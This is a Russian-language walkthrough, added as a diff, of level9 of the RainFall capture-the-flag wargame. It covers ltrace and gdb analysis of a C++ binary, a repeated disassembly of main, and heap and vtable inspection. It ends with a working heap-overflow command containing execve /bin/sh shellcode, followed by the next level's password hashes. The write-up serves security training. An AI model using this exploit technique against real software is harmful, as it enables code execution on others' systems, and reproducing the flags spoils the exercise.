@@ -1,0 +1,242 @@
+1) Пароль для уровня берем из level8: c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
+2) level9@RainFall:~$ ./level9  - ничего не происходит
+level9@RainFall:~$ ltrace ./level9
+__libc_start_main(0x80485f4, 1, 0xbffff804, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)     = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                  = 0
+_exit(1 <unfinished ...>
++++ exited (status 1) +++
+level9@RainFall:~$ ltrace ./level9 XXXX YYYY
+__libc_start_main(0x80485f4, 3, 0xbffff7e4, 0x8048770, 0x80487e0 <unfinished ...>
+_ZNSt8ios_base4InitC1Ev(0x8049bb4, 0xb7d79dc6, 0xb7eebff4, 0xb7d79e55, 0xb7f4a330)     = 0xb7fce990
+__cxa_atexit(0x8048500, 0x8049bb4, 0x8049b78, 0xb7d79e55, 0xb7f4a330)                  = 0
+_Znwj(108, 0xbffff7e4, 0xbffff7f4, 0xb7d79e55, 0xb7fed280)                             = 0x804a008
+_Znwj(108, 5, 0xbffff7f4, 0xb7d79e55, 0xb7fed280)                                      = 0x804a078
+strlen("XXXX")                                                                         = 4
+memcpy(0x0804a00c, "XXXX", 4)                                                          = 0x0804a00c
+_ZNSt8ios_base4InitD1Ev(0x8049bb4, 11, 0x804a078, 0x8048738, 0x804a00c)                = 0xb7fce4a0
++++ exited (status 11) +++
+Интересны _ZNSt8ios_base4InitD1Ev, strlen и memcpy 
+
+3) gdb ./level9
+4) Посмотрим переменные:
+All defined variables:
+
+Non-debugging symbols:
+0x08048838  _fp_hw
+0x0804883c  _IO_stdin_used
+0x08048840  vtable for N
+0x08048850  typeinfo name for N
+0x08048854  typeinfo for N
+0x08048a44  __FRAME_END__
+0x08049a48  __init_array_start
+0x08049a4c  __CTOR_LIST__
+0x08049a4c  __init_array_end
+0x08049a50  __CTOR_END__
+0x08049a54  __DTOR_LIST__
+0x08049a58  __DTOR_END__
+0x08049a5c  __JCR_END__
+0x08049a5c  __JCR_LIST__
+0x08049a60  _DYNAMIC
+0x08049b44  _GLOBAL_OFFSET_TABLE_
+0x08049b74  __data_start
+0x08049b74  data_start
+0x08049b78  __dso_handle
+0x08049b80  _ZTVN10__cxxabiv117__class_type_infoE@@CXXABI_1.3
+0x08049bac  completed.6159
+0x08049bb0  dtor_idx.6161
+0x08049bb4  std::__ioinit
+
+4) Посмотрим на функции:
+(gdb) info func
+All defined functions:
+
+Non-debugging symbols:
+0x08048464  _init
+0x080484b0  __cxa_atexit
+0x080484b0  __cxa_atexit@plt
+0x080484c0  __gmon_start__
+0x080484c0  __gmon_start__@plt
+0x080484d0  std::ios_base::Init::Init()
+0x080484d0  _ZNSt8ios_base4InitC1Ev@plt
+0x080484e0  __libc_start_main
+0x080484e0  __libc_start_main@plt
+0x080484f0  _exit
+0x080484f0  _exit@plt
+0x08048500  _ZNSt8ios_base4InitD1Ev
+0x08048500  _ZNSt8ios_base4InitD1Ev@plt
+0x08048510  memcpy
+0x08048510  memcpy@plt
+0x08048520  strlen
+0x08048520  strlen@plt
+0x08048530  operator new(unsigned int)
+0x08048530  _Znwj@plt
+0x08048540  _start
+0x08048570  __do_global_dtors_aux
+0x080485d0  frame_dummy
+0x080485f4  main
+0x0804869a  __static_initialization_and_destruction_0(int, int)
+0x080486da  _GLOBAL__sub_I_main
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+0x08048770  __libc_csu_init
+0x080487e0  __libc_csu_fini
+0x080487e2  __i686.get_pc_thunk.bx
+0x080487f0  __do_global_ctors_aux
+0x0804881c  _fini
+
+Подозрительные: 
+0x080486da  _GLOBAL__sub_I_main
+0x080486f6  N::N(int)
+0x080486f6  N::N(int)
+0x0804870e  N::setAnnotation(char*)
+0x0804873a  N::operator+(N&)
+0x0804874e  N::operator-(N&)
+main
+
+Программа написана на C++. Есть некий класс у которого перегружен оператор сложения и вычитания.
+
+5) (gdb) disas main
+Dump of assembler code for function main:
+   0x080485f4 <+0>:     push   %ebp
+   0x080485f5 <+1>:     mov    %esp,%ebp
+   0x080485f7 <+3>:     push   %ebx
+   0x080485f8 <+4>:     and    $0xfffffff0,%esp
+   0x080485fb <+7>:     sub    $0x20,%esp
+   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
+   0x08048602 <+14>:    jg     0x8048610 <main+28>
+   0x08048604 <+16>:    movl   $0x1,(%esp)
+   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
+   0x08048610 <+28>:    movl   $0x6c,(%esp)
+   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
+   0x0804861c <+40>:    mov    %eax,%ebx
+   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
+   0x08048626 <+50>:    mov    %ebx,(%esp)
+   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
+   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
+   0x08048632 <+62>:    movl   $0x6c,(%esp)
+   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
+   0x0804863e <+74>:    mov    %eax,%ebx
+   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
+   0x08048648 <+84>:    mov    %ebx,(%esp)
+   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
+   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
+   0x08048654 <+96>:    mov    0x1c(%esp),%eax
+   0x08048658 <+100>:   mov    %eax,0x14(%esp)
+   0x0804865c <+104>:   mov    0x18(%esp),%eax
+   0x08048660 <+108>:   mov    %eax,0x10(%esp)
+   0x08048664 <+112>:   mov    0xc(%ebp),%eax
+   0x08048667 <+115>:   add    $0x4,%eax
+   0x0804866a <+118>:   mov    (%eax),%eax
+   0x0804866c <+120>:   mov    %eax,0x4(%esp)
+   0x08048670 <+124>:   mov    0x14(%esp),%eax
+   0x08048674 <+128>:   mov    %eax,(%esp)
+   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:   mov    0x10(%esp),%eax
+   0x08048680 <+140>:   mov    (%eax),%eax
+   0x08048682 <+142>:   mov    (%eax),%edx
+   0x08048684 <+144>:   mov    0x14(%esp),%eax
+   0x08048688 <+148>:   mov    %eax,0x4(%esp)
+   0x0804868c <+152>:   mov    0x10(%esp),%eax
+   0x08048690 <+156>:   mov    %eax,(%esp)
+   0x08048693 <+159>:   call   *%edx
+   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
+   0x08048698 <+164>:   leave  
+   0x08048699 <+165>:   ret    
+End of assembler dump.
+
+0x08048617 <+35>:    call   0x8048530 <_Znwj@plt> - вызов new создания нового экземпляра класса
+0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei> - вызов конструктора этого класса и можем его посмотреть
+(gdb) !c++filt _ZN1NC2Ei
+N::N(int)
+
+6) (gdb) disas main
+Dump of assembler code for function main:
+   0x080485f4 <+0>:     push   %ebp
+   0x080485f5 <+1>:     mov    %esp,%ebp
+   0x080485f7 <+3>:     push   %ebx
+   0x080485f8 <+4>:     and    $0xfffffff0,%esp
+   0x080485fb <+7>:     sub    $0x20,%esp
+   0x080485fe <+10>:    cmpl   $0x1,0x8(%ebp)
+   0x08048602 <+14>:    jg     0x8048610 <main+28>
+   0x08048604 <+16>:    movl   $0x1,(%esp)
+   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
+   0x08048610 <+28>:    movl   $0x6c,(%esp)
+   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
+   0x0804861c <+40>:    mov    %eax,%ebx
+   0x0804861e <+42>:    movl   $0x5,0x4(%esp)
+   0x08048626 <+50>:    mov    %ebx,(%esp)
+   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
+   0x0804862e <+58>:    mov    %ebx,0x1c(%esp)
+   0x08048632 <+62>:    movl   $0x6c,(%esp)
+   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
+   0x0804863e <+74>:    mov    %eax,%ebx
+   0x08048640 <+76>:    movl   $0x6,0x4(%esp)
+   0x08048648 <+84>:    mov    %ebx,(%esp)
+   0x0804864b <+87>:    call   0x80486f6 <_ZN1NC2Ei>
+   0x08048650 <+92>:    mov    %ebx,0x18(%esp)
+   0x08048654 <+96>:    mov    0x1c(%esp),%eax
+   0x08048658 <+100>:   mov    %eax,0x14(%esp)
+   0x0804865c <+104>:   mov    0x18(%esp),%eax
+   0x08048660 <+108>:   mov    %eax,0x10(%esp)
+   0x08048664 <+112>:   mov    0xc(%ebp),%eax
+   0x08048667 <+115>:   add    $0x4,%eax
+   0x0804866a <+118>:   mov    (%eax),%eax
+   0x0804866c <+120>:   mov    %eax,0x4(%esp)
+   0x08048670 <+124>:   mov    0x14(%esp),%eax
+   0x08048674 <+128>:   mov    %eax,(%esp)
+   0x08048677 <+131>:   call   0x804870e <_ZN1N13setAnnotationEPc>
+   0x0804867c <+136>:   mov    0x10(%esp),%eax
+   0x08048680 <+140>:   mov    (%eax),%eax
+   0x08048682 <+142>:   mov    (%eax),%edx
+   0x08048684 <+144>:   mov    0x14(%esp),%eax
+   0x08048688 <+148>:   mov    %eax,0x4(%esp)
+   0x0804868c <+152>:   mov    0x10(%esp),%eax
+   0x08048690 <+156>:   mov    %eax,(%esp)
+   0x08048693 <+159>:   call   *%edx
+   0x08048695 <+161>:   mov    -0x4(%ebp),%ebx
+   0x08048698 <+164>:   leave  
+   0x08048699 <+165>:   ret    
+End of assembler dump.
+
+Поставим брейк поинт на: 
+(gdb) b *0x08048670
+Breakpoint 1 at 0x8048670
+(gdb) r XXXX YYYY
+Starting program: /home/user/level9/level9 XXXX YYYY
+
+Breakpoint 1, 0x08048670 in main ()
+
+Берем адрес: _Znwj(108, 0xbffff7e4, 0xbffff7f4, 0xb7d79e55, 0xb7fed280) = 0x804a008
+(gdb) x/32x 0x804a008
+0x804a008:      0x08048848      0x00000000      0x00000000      0x00000000
+0x804a018:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a028:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a038:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a048:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a058:      0x00000000      0x00000000      0x00000000      0x00000000
+0x804a068:      0x00000000      0x00000000      0x00000005      0x00000071
+0x804a078:      0x08048848      0x00000000      0x00000000      0x00000000
+Видим объект так как у нас C++, то первая строка это таблица виртуальных функци - место куда он ссылается,
+чтобы вытащить  или найти какие-либо методы класса. Следующие 5 строк - буффер. Следующая строка - 
+это число которое мы положили. И последняя строка - это начало второго объекта.
+
+6) Если посомтреть на строку 159    0x08048693 <+159>:   call   *%edx, то видим что нужно как-то 
+перезаписать оператор сложения -> доходим до второго объекта и перезаписываем адрес 0x08048848
+на оператор сложения 0x0804873a  N::operator+(N&)
+
+7) Размер shell code = 28байт. 
+   Размер начального адреса  = 4байт. 
+   Надо заполнить 108 байт, 108-28-4 = 76 байт. 
+
+8) Окончательную команду: 
+./level9 $(python -c 'print "\x10\xa0\x04\x08"+"\x31\xdb\x31\xd2\x31\xc9\x51\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc0\xb0\x0b\x83\xe4\xf0\xcd\x80"+"A"*76+"\x0c\xa0\x04\x08"') 
+То есть идем по стэку доходим до конца и перезаписываем адрес на необходимы нам адрес начала.
+
+9) cat /home/user/bonus0/.pass 
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728 
+
+Ответ: f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
